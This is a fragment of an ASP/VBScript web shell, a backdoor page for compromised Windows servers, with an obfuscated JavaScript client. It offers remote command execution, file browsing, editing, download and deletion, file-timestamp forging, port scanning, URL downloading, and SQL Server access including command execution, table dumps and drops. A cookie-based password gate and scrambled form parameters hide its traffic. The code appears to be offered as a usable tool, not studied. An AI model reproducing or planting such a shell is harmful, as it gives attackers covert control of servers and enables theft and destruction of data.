    Dim UTF8
    Set UTF8 = CreateObject("System.Text.UTF8Encoding")
    stringToUTFBytes = UTF8.GetBytes_4(aString)
End Function

Function EncodePassword(str)
	EncodePassword = BytesToBase64(md5hashBytes(stringToUTFBytes(str)))
End Function
	
Function Login()
On Error Resume Next
	If EncodePassword(Request.Form("pswd")) <> password And Request.Cookies("psswrd") <> password Then
%>
		<style>
		div{
			border:5px solid black;
			width:300px;
			height:100px;
		}
		</style>
		<Table width=100% height=100% align=center>
			<tr><td align=center valign=middle>
				<div>
				<Form method='POST' action='' name='form_login'>
					<h2>Input Password.</h2>
					<input type='password' name='pswd'>
					<input type='submit' name='submit' value=' OK '>
				</Form>
				</div>
			</td></tr>
		</Table>
<%
		runJScript("top.form_login.pswd.focus();")
		Response.End
	Else
		Response.Cookies("psswrd") = password
	End If
ErrAlert
End Function

Sub ErrAlert
	If Err.Number <> 0 Then
		runJScript("alert("""&Err.Number&"\n"&Err.Description&"\n"&Err.Source&""");")
		Err.Clear
	End If
End Sub

Function Encode(str)
	Randomize
	Base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
	For i = 1 To Len(str)
		If i Mod 3 = 0 Then tmp = tmp & Mid(str,i,1)
	Next
	For i = 1 To Len(str)
		If i Mod 3 = 1 Then tmp = tmp & Mid(str,i,1)
	Next
	For i = 1 To Len(str)
		If i Mod 3 = 2 Then tmp = tmp & Mid(str,i,1)
	Next
	Tmp = Replace(tmp, "\", "@")
	For i = 1 To Len(Tmp)
		index = CInt(Rnd*64 + 1)
		Encode = Encode & Mid(Base, index, 1)
		Encode = Encode & Mid(Tmp, i, 1)
	Next
End Function

Function Decode(str)
	Tmp = Str
	Str = ""
	For i = 2 To Len(Tmp) Step 2
		str = str & Mid(Tmp, i, 1)
	Next

	Dim array()
	ReDim array(Len(str) + 1)
	index = 1
	For i = 1 To Len(str)
		If i Mod 3 = 0 Then
			array(i) = Mid(str, index, 1)
			index = index + 1
		End If
	Next
	For i = 1 To Len(str)
		If i Mod 3 = 1 Then
			array(i) = Mid(str, index, 1)
			index = index + 1
		End If
	Next
	For i = 1 To Len(str)
		If i Mod 3 = 2 Then
			array(i) = Mid(str, index, 1)
			index = index + 1
		End If
	Next
	For i = 1 To Len(str)
		buffer = buffer & array(i)
	Next
	Decode = Replace(buffer,"@","\")
End Function
%>

<script language='javascript'>
function encode(str)
{
	var base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
	var tmp = "";
	var i = 0;
	for (i=0;i<str.length;i++)
	{
		if (i % 3 == 2)
		{
			tmp = tmp + str.charAt(i);
		}
	}
	for (i=0;i<str.length;i++)
	{
		if (i % 3 == 0)
		{
			tmp = tmp + str.charAt(i);
		}
	}
	for (i=0;i<str.length;i++)
	{
		if (i % 3 == 1)
		{
			tmp = tmp + str.charAt(i);
		}
	}
	var ret = "";
	for (var i = 0;i < tmp.length; i++) {
		ret += base.charAt(Math.random()*64);
		ret += tmp.charAt(i);
	}
	return ret;
}
function decode(str)
{
	var tmp = "";
	var arr = [];
	var index = 0;

	for (var i = 1; i < str.length; i += 2)
	{
		tmp += str.charAt(i);
	}
	str = tmp;

	for (i=0;i<str.length;i++)
	{
		if (i % 3 == 2)
		{
			arr[i] = str.charAt(index)
			index = index + 1;
		}
	}
	for (i=0;i<str.length;i++)
	{
		if (i % 3 == 0)
		{
			arr[i] = str.charAt(index)
			index = index + 1;
		}
	}
	for (i=0;i<str.length;i++)
	{
		if (i % 3 == 1)
		{
			arr[i] = str.charAt(index)
			index = index + 1;
		}
	}
	tmp = "";
	for (i=0;i<str.length;i++)
	{
		tmp = tmp + arr[i];
	}
	return tmp;
}
function showCMD(){
	top.form_signal.submit1.value = encode("CMD");
	top.form_signal.submit2.value = "";
	top.form_signal.submit3.value = "";
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function submitCMD(){
	top.form_signal.submit1.value = encode("CMD");
	if (top.form_cmd.check_wscript.checked)
		top.form_signal.submit2.value = encode("WSCRIPT")
	else
		top.form_signal.submit2.value = encode("NONWSCRIPT")
	top.form_signal.submit3.value = encode(top.form_cmd.cmdpath.value)
	top.form_signal.submit4.value = encode(top.form_cmd.cmd.value)
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function submitCMD1(){
	top.form_signal.submit1.value = encode("CMD");
	top.form_signal.submit2.value = encode("SHELL")
	top.form_signal.submit3.value = encode(top.form_cmd.cmdpath.value)
	top.form_signal.submit4.value = encode(top.form_cmd.cmd.value)
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function showServerInfo(){
	top.form_signal.submit1.value = encode("SVINFO");
	top.form_signal.submit2.value = "";
	top.form_signal.submit3.value = "";
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function showFolder(){
	top.form_signal.submit1.value = encode("FOLDER");
	top.form_signal.submit2.value = encode("GO");
	top.form_signal.submit3.value = "";
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function goFolder(folder){
	folder = decode(folder);
	top.form_signal.submit1.value = encode("FOLDER");
	top.form_signal.submit2.value = encode("GO");
	top.form_folder_go.go.focus();
	if (folder == "")
		top.form_signal.submit3.value = encode(top.form_folder_go.golocation.value);
	else
		top.form_signal.submit3.value = encode(folder);
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function download(filename){
	filename = decode(filename);
	top.form_signal.submit1.value = encode("FOLDER");
	top.form_signal.submit2.value = encode("DOWNLOAD");
	top.form_signal.submit3.value = encode(filename);
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function edit(filename){
	filename = decode(filename);
	top.form_signal.submit1.value = encode("FOLDER");
	top.form_signal.submit2.value = encode("EDIT");
	top.form_signal.submit3.value = encode(filename);
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function saveedit(filename){
	filename = decode(filename);
	top.form_folder_edit.submit1.value = encode("FOLDER");
	top.form_folder_edit.submit2.value = encode("EDIT");
	top.form_folder_edit.submit3.value = encode(filename);
	top.form_folder_edit.submit4.value = encode("SAVE");
	top.form_folder_edit.submit();
}
function deletefile(filename){
	filename = decode(filename);
	if (confirm("Are you sure you want performently delete this file?") == false)
		return;
	top.form_signal.submit1.value = encode("FOLDER");
	top.form_signal.submit2.value = encode("DELETE");
	top.form_signal.submit3.value = encode(filename);
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function deletefolder(foldname){
	foldname = decode(foldname);
	if (confirm("Are you sure you want performently delete this folder?") == false)
		return;
	top.form_signal.submit1.value = encode("FOLDER");
	top.form_signal.submit2.value = encode("DELFOLD");
	top.form_signal.submit3.value = encode(foldname);
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function createNew(){
	top.form_signal.submit1.value = encode("FOLDER");
	top.form_signal.submit2.value = encode("CREATE");
	if(top.form_folder_create.radio_file.checked)
		top.form_signal.submit3.value = encode("FILE");
	else
		top.form_signal.submit3.value = encode("FOLDER")
	top.form_signal.submit4.value = encode(top.form_folder_create.newname.value)
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function formChangeMD(filename)
{
	filename = decode(filename);
	top.form_signal.submit1.value = encode("FOLDER");
	top.form_signal.submit2.value = encode("FORMCHANGEMD");
	top.form_signal.submit3.value = encode(filename);
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function changeMD(filename)
{
	filename = decode(filename);
	top.form_signal.submit1.value = encode("FOLDER");
	top.form_signal.submit2.value = encode("CHANGEMD");
	top.form_signal.submit3.value = encode(filename);
	top.form_signal.submit4.value = encode(top.form_folder_date.newdate.value);
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function copyMD(filename)
{
	filename = decode(filename);
	top.form_signal.submit1.value = encode("FOLDER");
	top.form_signal.submit2.value = encode("COPYMD");
	top.form_signal.submit3.value = encode(filename);
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function pasteMD(filename)
{
	filename = decode(filename);
	top.form_signal.submit1.value = encode("FOLDER");
	top.form_signal.submit2.value = encode("PASTEMD");
	top.form_signal.submit3.value = encode(filename);
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function showNetScan()
{
	top.form_signal.submit1.value = encode("NETSCAN");
	top.form_signal.submit2.value = "";
	top.form_signal.submit3.value = "";
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function netscan()
{
	top.form_signal.submit1.value = encode("NETSCAN");
	top.form_signal.submit2.value = encode("SCAN");
	top.form_signal.submit3.value = encode(top.form_netscan.ip.value);
	top.form_signal.submit4.value = encode(top.form_netscan.port.value);
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function showUrlDownload()
{
	top.form_signal.submit1.value = encode("URLD");
	top.form_signal.submit2.value = "";
	top.form_signal.submit3.value = "";
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function doUrlD()
{
	top.form_urld.submit1.value = encode("URLD");
	top.form_urld.submit2.value = encode("Download");
	top.form_urld.submit();
}
function showDatabase()
{
	top.form_signal.submit1.value = encode("DATABASE");
	top.form_signal.submit2.value = "";
	top.form_signal.submit3.value = "";
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function showColumn(tbl)
{
	tbl = decode(tbl);
	top.form_signal.submit1.value = encode("DATABASE");
	top.form_signal.submit2.value = encode("COLUMN");
	top.form_signal.submit3.value = encode("Driver={Sql Server};Server=" + top.form_db.host_ip.value + "," + top.form_db.host_port.value + ";Database=" + top.form_db.db.value + ";Uid=" + top.form_db.user.value + ";Pwd=" + top.form_db.pswd.value);
	top.form_signal.submit4.value = encode(tbl);
	top.form_signal.submit5.value = "";
	top.form_signal.submit();

}
function gotoquery(query, pgnum)
{
	query = decode(query)
	top.form_signal.submit1.value = encode("DATABASE");
	top.form_signal.submit2.value = encode("QUERY");
	top.form_signal.submit3.value = encode("Driver={Sql Server};Server=" + top.form_db.host_ip.value + "," + top.form_db.host_port.value + ";Database=" + top.form_db.db.value + ";Uid=" + top.form_db.user.value + ";Pwd=" + top.form_db.pswd.value);
	if (query == "")
		top.form_signal.submit4.value = encode(top.form_query.sql_query.value);
	else
		top.form_signal.submit4.value = encode(query);
	if (pgnum == -1)
		top.form_signal.submit5.value = encode(top.form_tab.pgnum.value);
	else
		top.form_signal.submit5.value = encode(pgnum.toString());
	top.form_signal.submit();
}
function db_cmd_extend()
{
	top.form_signal.submit1.value = encode("DATABASE");
	top.form_signal.submit2.value = encode("CMDEXTEND");
	top.form_signal.submit3.value = encode("Driver={Sql Server};Server=" + top.form_db.host_ip.value + "," + top.form_db.host_port.value + ";Database=" + top.form_db.db.value + ";Uid=" + top.form_db.user.value + ";Pwd=" + top.form_db.pswd.value);
	top.form_signal.submit4.value = "";
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function db_cmd_exec()
{
	top.form_signal.submit1.value = encode("DATABASE");
	top.form_signal.submit2.value = encode("CMD");
	top.form_signal.submit3.value = encode("Driver={Sql Server};Server=" + top.form_db.host_ip.value + "," + top.form_db.host_port.value + ";Database=" + top.form_db.db.value + ";Uid=" + top.form_db.user.value + ";Pwd=" + top.form_db.pswd.value);
	top.form_signal.submit4.value = encode(top.form_db_cmd.db_cmd_path.value);
	top.form_signal.submit5.value = encode(top.form_db_cmd.db_command.value);
	top.form_signal.submit();
}
function editTable(index)
{
	top.form_signal.submit1.value = encode("DATABASE");
	top.form_signal.submit2.value = encode("FORMEDIT");
	top.form_signal.submit3.value = encode("Driver={Sql Server};Server=" + top.form_db.host_ip.value + "," + top.form_db.host_port.value + ";Database=" + top.form_db.db.value + ";Uid=" + top.form_db.user.value + ";Pwd=" + top.form_db.pswd.value);
	top.form_signal.submit4.value = encode(top.form_tab.pgnum.value);
	top.form_signal.submit5.value = encode(index.toString());
	top.form_signal.submit();
}
function db_delete(pgnum, index)
{
	if (confirm("Are you sure you want performently delete this record?") == false)
		return;
	top.form_signal.submit1.value = encode("DATABASE");
	top.form_signal.submit2.value = encode("DELETE");
	top.form_signal.submit3.value = encode("Driver={Sql Server};Server=" + top.form_db.host_ip.value + "," + top.form_db.host_port.value + ";Database=" + top.form_db.db.value + ";Uid=" + top.form_db.user.value + ";Pwd=" + top.form_db.pswd.value);
	top.form_signal.submit4.value = encode(pgnum.toString());
	top.form_signal.submit5.value = encode(index.toString());
	top.form_signal.submit();
}
function db_update(pgnum,index)
{
	top.form_db_update.submit1.value = encode("DATABASE");
	top.form_db_update.submit2.value = encode("UPDATE");
	top.form_db_update.submit3.value = encode("Driver={Sql Server};Server=" + top.form_db.host_ip.value + "," + top.form_db.host_port.value + ";Database=" + top.form_db.db.value + ";Uid=" + top.form_db.user.value + ";Pwd=" + top.form_db.pswd.value);
	top.form_db_update.submit4.value = encode(pgnum.toString());
	top.form_db_update.submit5.value = encode(index.toString());
	top.form_db_update.submit();
}
function insertIntoTable(tbl)
{
	tbl = decode(tbl);
	top.form_signal.submit1.value = encode("DATABASE");
	top.form_signal.submit2.value = encode("FORMINSERT");
	top.form_signal.submit3.value = encode("Driver={Sql Server};Server=" + top.form_db.host_ip.value + "," + top.form_db.host_port.value + ";Database=" + top.form_db.db.value + ";Uid=" + top.form_db.user.value + ";Pwd=" + top.form_db.pswd.value);
	top.form_signal.submit4.value = encode(tbl);
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function db_insert(tbl)
{
	tbl = decode(tbl);
	top.form_db_insert.submit1.value = encode("DATABASE");
	top.form_db_insert.submit2.value = encode("INSERT");
	top.form_db_insert.submit3.value = encode("Driver={Sql Server};Server=" + top.form_db.host_ip.value + "," + top.form_db.host_port.value + ";Database=" + top.form_db.db.value + ";Uid=" + top.form_db.user.value + ";Pwd=" + top.form_db.pswd.value);
	top.form_db_insert.submit4.value = encode(tbl);
	top.form_signal.submit5.value = "";
	top.form_db_insert.submit();
}
function dropTable(tbl)
{
	tbl = decode(tbl);
	if (confirm("Are you sure you want performently drop this table?") == false)
		return;
	top.form_signal.submit1.value = encode("DATABASE");
	top.form_signal.submit2.value = encode("DROPTABLE");
	top.form_signal.submit3.value = encode("Driver={Sql Server};Server=" + top.form_db.host_ip.value + "," + top.form_db.host_port.value + ";Database=" + top.form_db.db.value + ";Uid=" + top.form_db.user.value + ";Pwd=" + top.form_db.pswd.value);
	top.form_signal.submit4.value = encode(tbl);
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function dumpTable(tbl)
{
	tbl = decode(tbl);
	top.form_signal.submit1.value = encode("DATABASE");
	top.form_signal.submit2.value = encode("DUMP");
	top.form_signal.submit3.value = encode("Driver={Sql Server};Server=" + top.form_db.host_ip.value + "," + top.form_db.host_port.value + ";Database=" + top.form_db.db.value + ";Uid=" + top.form_db.user.value + ";Pwd=" + top.form_db.pswd.value);
	top.form_signal.submit4.value = encode(tbl);
	top.form_signal.submit5.value = "";
	top.form_signal.submit();
}
function checkAll(form) {
	for (var i = 0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
			e.checked = form.chkall.checked;
	}
}
function onFilesDelete() {
	top.form_filelist.submit();
}
</script>
</body>
</html>
